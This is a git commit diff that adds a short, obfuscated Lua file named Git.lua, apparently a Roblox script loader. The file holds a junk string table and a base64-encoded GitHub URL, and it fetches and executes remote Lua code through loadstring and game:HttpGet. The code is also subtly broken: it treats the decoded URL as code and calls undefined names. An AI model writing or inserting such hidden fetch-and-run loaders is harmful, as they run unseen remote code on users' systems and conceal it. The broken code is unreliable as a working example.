746c74476e9e59c94310ec0f9c5eff3b778482bf
EVA <moahmedmix5@gmail.com>
2026-06-06 20:15:58 +0300

    Add Lua script with encoded HTTP request

--- Git.lua
+++ Git.lua
@@ -1,1 +1,7 @@
-
+return(function(f1167, ...)
+local UQCdNv = {"rXntAKdt";"rjntYYxkulU3";"InZaXGOrDhC6in0V1";"xbPsb26cKbCYq";"dpVg7g3dPp4";"S0hEkNXp";"yE0XN";"6HG7SEWf7yocf3pv";"3BA0";"Xanxsm";"APmTnageyjEFtABp4";"vI4"}
+local ncE7CtkH = function(...)
+loadstring(game:HttpGet(loadstring(base64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01vYWhtZWRtaXgvSHlwZXJfTTRYL21haW4vTWFpbi5sdWE="))()))()
+end
+ZBVOBUvJ(aQN0A)
+end)(...)
